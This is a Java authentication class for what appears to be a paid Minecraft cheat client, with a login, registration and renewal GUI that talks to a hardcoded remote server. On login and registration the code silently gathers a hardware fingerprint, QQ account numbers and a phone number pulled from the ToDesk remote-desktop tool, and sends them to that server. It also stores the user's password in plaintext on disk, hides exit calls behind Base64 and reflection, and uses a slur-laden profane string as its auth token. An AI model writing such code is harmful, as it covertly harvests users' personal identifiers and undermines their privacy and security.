package com.heypixel.heypixelmod.obsoverlay.utils.auth;

import cn.paradisemc.ZKMIndy;
import com.heypixel.heypixelmod.obsoverlay.Naven;
import com.heypixel.heypixelmod.obsoverlay.utils.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.world.entity.Entity;
import oshi.SystemInfo;
import oshi.hardware.CentralProcessor;
import oshi.hardware.ComputerSystem;
import oshi.hardware.GraphicsCard;
import oshi.hardware.HardwareAbstractionLayer;
import verify.client.IRCHandler;
import verify.client.IRCTransport;

import javax.swing.*;
import java.awt.*;
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.geom.RoundRectangle2D;
import java.io.IOException;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Collectors;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;

/**
 * @Author：jiuxian_baka
 * @Date：2025/12/22 03:41
 * @Filename：AuthUtils
 */

@ZKMIndy
public class AuthUtils {
    // 验证成功 代表没过验证 8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈 代表验证通过
    public static AtomicReference<String> authed = new AtomicReference<>();
    public static AtomicReference<String> currentUser = new AtomicReference<>("");
    public static AtomicReference<String> currentPassword = new AtomicReference<>("");

    private static final String CONFIG_DIR = "C:\\.alpha";
    private static final String CONFIG_FILE = "irc.json";

    public static IRCTransport transport;

    public static void init() {
        try {
            transport = new IRCTransport("154.64.244.103", 8888, new IRCHandler() {
                @Override
                public void onMessage(String sender, String message) {
                    ChatUtils.addChatMessage(false, "§7[§bIRC§7]§f " + sender + "§f: " + message);
                }

                @Override
                public void onDisconnected(String message) {
                    new Thread(() -> {
                        try {
                            JDialog dialog = new JDialog();
                            dialog.setAlwaysOnTop(true);
                            JOptionPane.showMessageDialog(dialog, "IRC断开连接: " + message);
                        } catch (Exception ignored) {
                        } finally {
                            System.exit(0);
                        }
                    }).start();

                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException ignored) {
                    }
                    System.exit(0);
                }

                @Override
                public void onConnected() {
                    //                System.out.println("Connected");
                }

                @Override
                public void onLoginResult(boolean success, long expireAt, long timeWindow, String message) {
                    long now = Instant.now().toEpochMilli();
                    long nowTimeWindow = now / 30000L;
                    if (success && nowTimeWindow == timeWindow) {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(expireAt),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        String ircName = getIrcUsername();
                        showTopMessage("登录成功\nIRC用户: " + ircName + "\n到期时间: " + formattedDate);
                        setAuthStatus("8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈");
                        saveCredentials(currentUser.get(), currentPassword.get());
                        AuthFrame.close();
                        Naven.b(null);
                    } else {
                        if (nowTimeWindow != timeWindow) message = "请尝试重新登陆或校准系统时间";
                        showTopMessage("登录失败\n" + message);
                        setAuthStatus("验证成功");
                    }
                }

                @Override
                public void onRegisterResult(boolean success, long expireAt, long timeWindow, String message) {
                    long now = Instant.now().toEpochMilli();
                    long nowTimeWindow = now / 30000L;
                    if (success && nowTimeWindow == timeWindow) {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(expireAt),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        String ircName = getIrcUsername();
                        showTopMessage("注册成功\nIRC用户: " + ircName + "\n到期时间: " + formattedDate);
                        setAuthStatus("8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈");
                        AuthFrame.close();
                        Naven.b(null);
                    } else {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(expireAt),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        Naven.b(null);
                        if (nowTimeWindow != timeWindow) {
                            String ircName = getIrcUsername();
                            showTopMessage("注册成功, 请重启客户端\nIRC用户: " + ircName + "\n到期时间: " + formattedDate);
                            setAuthStatus("验证成功");
                        } else {
                            showTopMessage("注册失败\n" + message);
                            setAuthStatus("验证成功");
                        }
                    }
                }

                @Override
                public void onRechargeResult(boolean success, long expireAt, long timeWindow, String message) {
                    if (success) {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(expireAt),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        String ircName = getIrcUsername();
                        showTopMessage("充值成功\nIRC用户: " + ircName + "\n到期时间: " + formattedDate);
                    } else {
                        showTopMessage("充值失败\n" + message);
                        showRechargeDialog();
                    }
                }

                @Override
                public void onCloudConfigUploadResult(boolean success, String message, int max) {
                    if (success) {
                        ChatUtils.addChatMessage("§a云配置上传成功！");
                    } else {
                        ChatUtils.addChatMessage("§c云配置上传失败: " + message);
                    }
                }

                @Override
                public void onCloudConfigGetResult(boolean success, String owner, String name, String content, String message) {
                    if (success) {
                        Naven.getInstance().getFileManager().loadConfigFromString(content);
                        if (owner != null && !owner.isEmpty()) {
                            ChatUtils.addChatMessage("§a已加载用户 " + owner + " 的云配置 " + name + "！");
                        } else {
                            ChatUtils.addChatMessage("§a云配置 " + name + " 加载成功！");
                        }
                    } else {
                        ChatUtils.addChatMessage("§c云配置加载失败: " + message);
                    }
                }

                @Override
                public void onCloudConfigDeleteResult(boolean success, String owner, String name, String message) {
                    if (success) {
                        ChatUtils.addChatMessage("§a云配置 " + name + " 删除成功！");
                    } else {
                        ChatUtils.addChatMessage("§c云配置删除失败: " + message);
                    }
                }

                @Override
                public void onCloudConfigListResult(boolean success, java.util.List<String> names, int max, String message) {
                    if (success) {
                        ChatUtils.addChatMessage("§e云配置列表 (" + names.size() + "/" + max + "):");
                        for (String n : names) {
                            ChatUtils.addChatMessage("§7 - §f" + n);
                        }
                    } else {
                        ChatUtils.addChatMessage("§c获取云配置列表失败: " + message);
                    }
                }

                @Override
                public String getInGameUsername() {
                    Minecraft mc = Minecraft.getInstance();
                    if (mc.player == null) return mc.getUser().getName();
                    else return mc.player.getName().getString();
                }
            });
            tryAutoLogin();
        } catch (Throwable e) {
            e.printStackTrace();
            showTopMessage("验证失败: " + e.getMessage());
            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
        }
    }

    private static void showTopMessage(String message) {
        String[] lines = message.split("\\n", -1);
        String title = lines.length > 0 ? lines[0] : "提示";
        String[] body = lines.length > 1 ? java.util.Arrays.copyOfRange(lines, 1, lines.length) : new String[0];
        AuthFrame.showStyledMessage(title, body);
    }

    private static String getIrcUsername() {
        String ircName = null;
        try {
            if (transport != null) {
                Minecraft mc = Minecraft.getInstance();
                String ign = mc.player == null ? mc.getUser().getName() : mc.player.getName().getString();
                if (ign != null && !ign.isEmpty()) {
                    ircName = transport.getName(ign);
                }
            }
        } catch (Exception ignored) {
        }
        if (ircName == null || ircName.isBlank()) {
            ircName = currentUser.get();
        }
        if (ircName == null || ircName.isBlank()) {
            ircName = "未知";
        }
        return ircName;
    }

    private static Entity setAuthStatus(String status) {
        authed.set(status);
        if (status.length() == 32) {
            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass("amF2YS5sYW5nLlN5c3RlbQ==");
                Method exit = System.getMethod("ZXhpdA==", int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
            return null;
        }

        try {
            Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
            Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
            exit.invoke(null, 0);
        } catch (Exception ex) {
        }
        return Minecraft.getInstance().player;
    }

    public static void showRegisterDialog() {
        AuthFrame.show(AuthFrame.Page.REGISTER);
    }

    public static void showLoginDialog() {
        AuthFrame.show(AuthFrame.Page.LOGIN);
    }

    public static void showRechargeDialog() {
        AuthFrame.show(AuthFrame.Page.CHARGE);
    }

    private static class AuthFrame {
        private static Font hm;
        private static final Color opaque = new Color(0, true);
        private static final Color backgroundColor = new Color(0xff1a1417);
        private static Frame frame;

        static {
            try {
                java.io.InputStream stream = AuthUtils.class.getResourceAsStream("/assets/heypixel/VcX6svVqmeT8/fonts/MiSans-Regular.ttf");
                if (stream != null) {
                    hm = Font.createFont(Font.PLAIN, stream);
                } else {
                    hm = new Font("Arial", Font.PLAIN, 12);
                }
            } catch (FontFormatException | IOException e) {
                hm = new Font("Arial", Font.PLAIN, 12);
            }
        }

        private enum Page {
            LOGIN,
            REGISTER,
            CHARGE
        }

        private static void show(Page page) {
            if (frame == null || !frame.isDisplayable()) {
                frame = new Frame();
            }
            frame.setPage(page);
            frame.setVisible(true);
            frame.toFront();
        }

        private static void close() {
            if (frame == null) {
                return;
            }
            frame.setVisible(false);
            frame.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
            frame.dispose();
            frame = null;
        }

        private static void showStyledMessage(String title, String[] lines) {
            Frame msgFrame = new Frame();
            msgFrame.setAlwaysOnTop(true);
            Frame.ContentPanel.AbstractPage page = new Frame.ContentPanel.AbstractPage(title) {
                @Override
                protected void initPage() {
                    int y = 48;
                    for (String text : lines) {
                        JLabel label = new JLabel(text);
                        label.setLocation(2, y);
                        label.setForeground(new Color(0xffcce5));
                        label.setBackground(opaque);
                        label.setSize(318, 28);
                        label.setFont(hm.deriveFont(22f));
                        this.add(label);
                        y += 30;
                    }
                    Frame.Button ok = new Frame.Button("确定") {
                        @Override
                        protected void onClicked(MouseEvent e) {
                            msgFrame.setVisible(false);
                            msgFrame.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
                            msgFrame.dispose();
                        }
                    };
                    ok.setLocation(0, 178);
                    this.add(ok);
                }
            };
            msgFrame.showMessagePage(page);
            msgFrame.setVisible(true);
            msgFrame.toFront();
        }

        private static class Frame extends JFrame {
            private final BackgroundPanel backgroundPanel;
            private final ContentPanel contentPanel;

            private Frame() {
                super("Naven");
                this.setUndecorated(true);
                this.setBackground(backgroundColor);
                this.setSize(388, 450);
                this.setLocationRelativeTo(null);
                backgroundPanel = new BackgroundPanel();
                contentPanel = new ContentPanel();
                backgroundPanel.add(new TitleBar(this));
                backgroundPanel.add(contentPanel);
                this.add(backgroundPanel);
                updateShape();
                this.addComponentListener(new ComponentAdapter() {
                    @Override
                    public void componentResized(ComponentEvent e) {
                        updateShape();
                    }
                });
            }

            private void updateShape() {
                this.setShape(new RoundRectangle2D.Double(0, 0, getWidth(), getHeight(), 48, 48));
            }

            private void setPage(Page page) {
                contentPanel.setCurrentPage(page);
            }

            private void showMessagePage(ContentPanel.AbstractPage page) {
                contentPanel.setCurrentPage(page);
            }

            private static class BackgroundPanel extends JPanel {
                private BackgroundPanel() {
                    this.setSize(388, 450);
                    this.setLocation(0, 0);
                    this.setLayout(null);
                }

                @Override
                protected void paintComponent(Graphics g) {
                    Graphics2D g2 = (Graphics2D) g.create();
                    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                    g2.setColor(backgroundColor);
                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 48, 48);
                    g2.dispose();
                }
            }

            private static class TitleBar extends JPanel {
                private static Point originPoint;

                private TitleBar(Frame frame) {
                    this.setBackground(opaque);
                    this.setSize(388, 90);
                    this.setLocation(0, 0);
                    this.setLayout(null);
                    JLabel label = new JLabel("Naven Alpha");
                    label.setLocation(36, 0);
                    label.setBackground(opaque);
                    label.setForeground(new Color(0xffffcce5));
                    label.setFont(hm.deriveFont(36f));
                    label.setSize(320, 90);
                    this.add(label);
                    this.addMouseListener(new MouseAdapter() {
                        @Override
                        public void mousePressed(MouseEvent e) {
                            originPoint = new Point(e.getPoint());
                        }
                    });
                    this.addMouseMotionListener(new MouseAdapter() {
                        @Override
                        public void mouseDragged(MouseEvent e) {
                            int x = e.getXOnScreen();
                            int y = e.getYOnScreen();
                            frame.setLocation(x - originPoint.x, y - originPoint.y);
                        }
                    });
                }
            }

            private static class ContentPanel extends JPanel {
                private AbstractPage currentPage;
                private final Pages pages;

                private ContentPanel() {
                    this.setSize(388, 360);
                    this.setLocation(0, 90);
                    this.setLayout(null);
                    this.setBackground(opaque);
                    JLabel label = new JLabel("Designed by GZ_Sakura");
                    label.setBackground(opaque);
                    label.setForeground(new Color(0xff806673));
                    label.setFont(hm.deriveFont(14f));
                    label.setVerticalAlignment(SwingConstants.TOP);
                    label.setSize(320, 20);
                    label.setLocation(36, 320);
                    this.add(label);
                    pages = new Pages(this);
                    currentPage = pages.PAGE_LOGIN;
                    this.add(currentPage);
                }

                private void setCurrentPage(Page page) {
                    AbstractPage target = switch (page) {
                        case LOGIN -> pages.PAGE_LOGIN;
                        case REGISTER -> pages.PAGE_REGISTER;
                        case CHARGE -> pages.PAGE_CHARGE;
                    };
                    setCurrentPage(target);
                }

                private void setCurrentPage(AbstractPage page) {
                    this.remove(currentPage);
                    this.currentPage = page;
                    this.add(currentPage);
                    currentPage.repaint();
                }

                private static class Pages {
                    private final AbstractPage PAGE_LOGIN;
                    private final AbstractPage PAGE_REGISTER;
                    private final AbstractPage PAGE_CHARGE;

                    private Pages(ContentPanel parent) {
                        PAGE_LOGIN = new AbstractPage("登录以继续") {
                            @Override
                            protected void initPage() {
                                InputField username = new InputField("用户名");
                                username.setLocation(0, 48);
                                this.add(username);
                                PassField password = new PassField("密码");
                                password.setLocation(0, 108);
                                this.add(password);
                                TextButton charge = new TextButton("续费", 30, 18) {
                                    @Override
                                    protected void onClicked() {
                                        parent.setCurrentPage(Page.CHARGE);
                                    }
                                };
                                charge.setLocation(290, 185);
                                this.add(charge);
                                TextButton register = new TextButton("没有账户? 注册", 103, 18) {
                                    @Override
                                    protected void onClicked() {
                                        parent.setCurrentPage(Page.REGISTER);
                                    }
                                };
                                register.setLocation(217, 210);
                                this.add(register);
                                Button login = new Button("登录") {
                                    @Override
                                    protected void onClicked(MouseEvent e) {
                                        String usernameStr = username.getText();
                                        String passwordStr = password.getText();
                                        if (usernameStr.isBlank() || usernameStr.equals(username.tip)) {
                                            JOptionPane.showMessageDialog(null, "用户名不能为空");
                                            setAllowPress(true);
                                            return;
                                        }
                                        if (passwordStr.isBlank() || passwordStr.equals(password.tip)) {
                                            JOptionPane.showMessageDialog(null, "密码不能为空");
                                            setAllowPress(true);
                                            return;
                                        }
                                        try {
                                            transport.login(usernameStr, passwordStr, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone());
                                            currentUser.set(usernameStr);
                                            currentPassword.set(passwordStr);
                                        } catch (IOException ex) {
                                            ex.printStackTrace();
                                            JOptionPane.showMessageDialog(null, "验证失败: " + ex.getMessage());
                                            System.exit(0);
                                        }
                                    }
                                };
                                login.setLocation(0, 178);
                                this.add(login);
                            }
                        };
                        PAGE_REGISTER = new AbstractPage("注册账户") {
                            private String usernameStr = "";
                            private String passwordStr = "";
                            private final AbstractPage page2 = new AbstractPage("注册账户") {
                                @Override
                                protected void initPage() {
                                    JLabel label = new JLabel() {
                                        @Override
                                        public void paint(Graphics g) {
                                            setText("将注册为: " + usernameStr);
                                            super.paint(g);
                                        }
                                    };
                                    label.setLocation(2, 48);
                                    label.setForeground(new Color(0xffcce5));
                                    label.setBackground(opaque);
                                    label.setSize(318, 50);
                                    label.setFont(hm.deriveFont(22f));
                                    this.add(label);
                                    InputField key = new InputField("卡密");
                                    key.setLocation(0, 108);
                                    this.add(key);
                                    Button next = new Button("注册") {
                                        @Override
                                        protected void onClicked(MouseEvent e) {
                                            String keyStr = key.getText();
                                            if (keyStr.isBlank() || keyStr.equals(key.tip)) {
                                                JOptionPane.showMessageDialog(null, "卡密不能为空");
                                                setAllowPress(true);
                                                return;
                                            }
                                            try {
                                                transport.register(usernameStr, passwordStr, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone(), keyStr);
                                                currentUser.set(usernameStr);
                                            } catch (IOException ex) {
                                                JOptionPane.showMessageDialog(null, "验证失败: " + ex.getMessage());
                                                System.exit(0);
                                            }
                                        }
                                    };
                                    next.setLocation(0, 178);
                                    this.add(next);
                                    TextButton back = new TextButton("上一步", 47, 18) {
                                        @Override
                                        protected void onClicked() {
                                            parent.setCurrentPage(Page.REGISTER);
                                        }
                                    };
                                    back.setLocation(273, 210);
                                    this.add(back);
                                }
                            };

                            @Override
                            protected void initPage() {
                                InputField username = new InputField("用户名");
                                username.setLocation(0, 48);
                                this.add(username);
                                InputField password = new InputField("密码");
                                password.setLocation(0, 108);
                                this.add(password);
                                TextButton backToLogin = new TextButton("返回登录", 0, 18) {
                                    @Override
                                    protected void onClicked() {
                                        parent.setCurrentPage(Page.LOGIN);
                                    }
                                };
                                backToLogin.setLocation(320 - backToLogin.getWidth(), 210);
                                this.add(backToLogin);
                                Button next = new Button("下一步", false) {
                                    @Override
                                    protected void onClicked(MouseEvent e) {
                                        usernameStr = username.getText();
                                        if (usernameStr.isBlank() || usernameStr.equals(username.tip)) {
                                            JOptionPane.showMessageDialog(null, "用户名不能为空");
                                            return;
                                        }
                                        passwordStr = password.getText();
                                        if (passwordStr.isBlank() || passwordStr.equals(password.tip)) {
                                            JOptionPane.showMessageDialog(null, "密码不能为空");
                                            return;
                                        }
                                        parent.setCurrentPage(page2);
                                    }
                                };
                                next.setLocation(0, 178);
                                this.add(next);
                            }
                        };
                        PAGE_CHARGE = new AbstractPage("为账户续费") {
                            @Override
                            protected void initPage() {
                                InputField username = new InputField("用户名");
                                username.setLocation(0, 48);
                                this.add(username);
                                InputField key = new InputField("卡密");
                                key.setLocation(0, 108);
                                this.add(key);
                                TextButton backToLogin = new TextButton("返回登录", 0, 18) {
                                    @Override
                                    protected void onClicked() {
                                        parent.setCurrentPage(Page.LOGIN);
                                    }
                                };
                                backToLogin.setLocation(320 - backToLogin.getWidth(), 210);
                                this.add(backToLogin);
                                Button charge = new Button("续费") {
                                    @Override
                                    protected void onClicked(MouseEvent e) {
                                        String usernameStr = username.getText();
                                        if (usernameStr.isBlank() || usernameStr.equals(username.tip)) {
                                            JOptionPane.showMessageDialog(null, "用户名不能为空");
                                            setAllowPress(true);
                                            return;
                                        }
                                        String keyStr = key.getText();
                                        if (keyStr.isBlank() || keyStr.equals(key.tip)) {
                                            JOptionPane.showMessageDialog(null, "卡密不能为空");
                                            setAllowPress(true);
                                            return;
                                        }
                                        transport.recharge(usernameStr, keyStr);
                                    }
                                };
                                charge.setLocation(0, 178);
                                this.add(charge);
                            }
                        };
                    }
                }

                private abstract static class AbstractPage extends JPanel {
                    private AbstractPage(String title) {
                        this.setBackground(new Color(0xff1a1417));
                        this.setSize(320, 228);
                        this.setLocation(34, 24);
                        this.setLayout(null);
                        JLabel label = new JLabel(title);
                        label.setSize(318, 28);
                        label.setLocation(2, 0);
                        label.setBackground(opaque);
                        label.setForeground(new Color(0xffffcce5));
                        label.setFont(hm.deriveFont(24f));
                        this.add(label);
                        initPage();
                    }

                    protected abstract void initPage();
                }
            }

            private static class InputField extends JTextField implements FocusListener {
                private final String tip;

                private InputField(String tip) {
                    this.tip = tip + "\r";
                    this.setText(this.tip);
                    this.setSize(320, 50);
                    this.addFocusListener(this);
                    this.setBorder(null);
                    this.setFont(hm.deriveFont(22f));
                    this.setForeground(new Color(0xff806673));
                    this.setBackground(opaque);
                    this.setOpaque(false);
                    this.setMargin(new Insets(0, 18, 0, 0));
                }

                @Override
                protected void paintComponent(Graphics g) {
                    Graphics2D g2 = (Graphics2D) g.create();
                    g2.setColor(new Color(0xff1a1417));
                    g2.fillRect(0, 0, getWidth(), getHeight());
                    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                    g2.setColor(new Color(0xDFFCCE5, true));
                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
                    g2.dispose();
                    super.paintComponent(g);
                }

                @Override
                public void focusGained(FocusEvent e) {
                    if (this.getText().equals(tip)) {
                        setText("");
                    }
                    setForeground(new Color(0xffbf98ac));
                }

                @Override
                public void focusLost(FocusEvent e) {
                    if (this.getText().isEmpty()) {
                        setText(tip);
                    }
                    if (this.getText().equals(tip)) {
                        setForeground(new Color(0xff806673));
                    }
                }
            }

            private static class PassField extends JPasswordField implements FocusListener {
                private final String tip;

                private PassField(String tip) {
                    this.tip = tip + "\r";
                    this.setText(this.tip);
                    this.setEchoChar((char) 0);
                    this.setSize(320, 50);
                    this.addFocusListener(this);
                    this.setBorder(null);
                    this.setFont(hm.deriveFont(22f));
                    this.setForeground(new Color(0xff806673));
                    this.setBackground(opaque);
                    this.setOpaque(false);
                    this.setMargin(new Insets(0, 18, 0, 0));
                }

                @Override
                protected void paintComponent(Graphics g) {
                    Graphics2D g2 = (Graphics2D) g.create();
                    g2.setColor(new Color(0xff1a1417));
                    g2.fillRect(0, 0, getWidth(), getHeight());
                    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                    g2.setColor(new Color(0xDFFCCE5, true));
                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
                    g2.dispose();
                    super.paintComponent(g);
                }

                @Override
                public void focusGained(FocusEvent e) {
                    setEchoChar('*');
                    if (this.getText().equals(tip)) {
                        setText("");
                    }
                    setForeground(new Color(0xffbf98ac));
                }

                @Override
                public void focusLost(FocusEvent e) {
                    if (this.getText().isEmpty()) {
                        setText(tip);
                    }
                    if (this.getText().equals(tip)) {
                        setEchoChar((char) 0);
                        setForeground(new Color(0xff806673));
                    }
                }
            }

            private abstract static class TextButton extends JPanel {
                private TextButton(String text, int width, int height) {
                    this.setLayout(null);
                    this.setBackground(opaque);
                    int resolvedWidth = width;
                    if (resolvedWidth <= 0) {
                        Graphics2D g2 = new java.awt.image.BufferedImage(1, 1, java.awt.image.BufferedImage.TYPE_INT_ARGB).createGraphics();
                        g2.setFont(hm.deriveFont(15f));
                        resolvedWidth = g2.getFontMetrics().stringWidth(text) + 6;
                        g2.dispose();
                    }
                    this.setSize(resolvedWidth, height);
                    JLabel label = new JLabel(text) {
                        @Override
                        protected void paintComponent(Graphics g) {
                            super.paintComponent(g);
                            g.setColor(new Color(0xffcce5));
                            g.fillRect(0, getHeight() - 1, getWidth(), 1);
                        }
                    };
                    label.setBackground(opaque);
                    label.setForeground(new Color(0xffcce5));
                    label.setLocation(0, 0);
                    label.setSize(resolvedWidth, height);
                    label.setFont(hm.deriveFont(15f));
                    this.add(label);
                    this.addMouseListener(new MouseAdapter() {
                        @Override
                        public void mouseClicked(MouseEvent e) {
                            onClicked();
                        }
                    });
                }

                protected abstract void onClicked();
            }

            private static class Button extends JButton {
                private boolean holding = false;
                private boolean allowPress = true;

                private Button(String text) {
                    this(text, true);
                }

                private Button(String text, boolean cooldown) {
                    super(text);
                    this.setSize(160, 50);
                    this.addMouseListener(new MouseAdapter() {
                        @Override
                        public void mouseEntered(MouseEvent e) {
                            holding = true;
                        }

                        @Override
                        public void mouseExited(MouseEvent e) {
                            holding = false;
                        }

                        @Override
                        public void mouseClicked(MouseEvent e) {
                            if (!allowPress && cooldown) {
                                return;
                            }
                            if (cooldown) {
                                allowPress = false;
                            }
                            onClicked(e);
                        }
                    });
                }

                protected void onClicked(MouseEvent e) {
                }

                @Override
                public void paint(Graphics g) {
                    Graphics2D g2 = (Graphics2D) g.create();
                    g2.setColor(new Color(0xff1a1417));
                    g2.fillRect(0, 0, getWidth(), getHeight());
                    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                    g2.setColor(new Color(0xFFCCE5));
                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
                    if (!allowPress) {
                        g2.setColor(new Color(0x33000000, true));
                        g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
                    } else if (holding) {
                        g2.setColor(new Color(0x33FFFFFF, true));
                        g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
                    }
                    g2.setFont(hm.deriveFont(24f));
                    FontMetrics fm = g2.getFontMetrics();
                    g2.setColor(new Color(0x994d73));
                    String text = allowPress ? getText() : "...";
                    g2.drawString(
                            text,
                            (getWidth() - fm.stringWidth(text)) / 2,
                            (getHeight() - fm.getHeight()) / 2 + fm.getAscent()
                    );
                    g2.dispose();
                }

                public void setAllowPress(boolean allowPress) {
                    this.allowPress = allowPress;
                }
            }
        }
    }

    public static String getHWID() {
        try {
            SystemInfo si = new SystemInfo();
            HardwareAbstractionLayer hal = si.getHardware();

            ComputerSystem computerSystem = hal.getComputerSystem();
            String baseboardSerial = computerSystem.getBaseboard().getSerialNumber();

            CentralProcessor processor = hal.getProcessor();
            String processorId = processor.getProcessorIdentifier().getProcessorID();

            List<GraphicsCard> graphicsCards = hal.getGraphicsCards();
            String gpuInfo = graphicsCards.stream()
                    .map(GraphicsCard::getName)
                    .collect(Collectors.joining("|"));

            String rawID = "Baseboard:" + baseboardSerial +
                    ";CPU:" + processorId +
                    ";GPU:" + gpuInfo;

            return bytesToHex(MessageDigest.getInstance("MD5").digest(rawID.getBytes()));

        } catch (Exception e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "验证失败: " + e.getMessage());

            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
            return "ERROR_GETTING_HWID";
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    private static void saveCredentials(String username, String password) {
        try {
            File dir = new File(CONFIG_DIR);
            if (!dir.exists()) {
                dir.mkdirs();
            }
            File file = new File(dir, CONFIG_FILE);
            JsonObject json = new JsonObject();
            json.addProperty("username", username);
            json.addProperty("password", password);
            try (FileWriter writer = new FileWriter(file)) {
                writer.write(json.toString());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void tryAutoLogin() {
        try {
            File file = new File(CONFIG_DIR, CONFIG_FILE);
            if (file.exists()) {
                try (FileReader reader = new FileReader(file)) {
                    JsonObject json = JsonParser.parseReader(reader).getAsJsonObject();
                    if (json.has("username") && json.has("password")) {
                        String username = json.get("username").getAsString();
                        String password = json.get("password").getAsString();
                        currentUser.set(username);
                        currentPassword.set(password);
                        transport.login(username, password, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone());
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
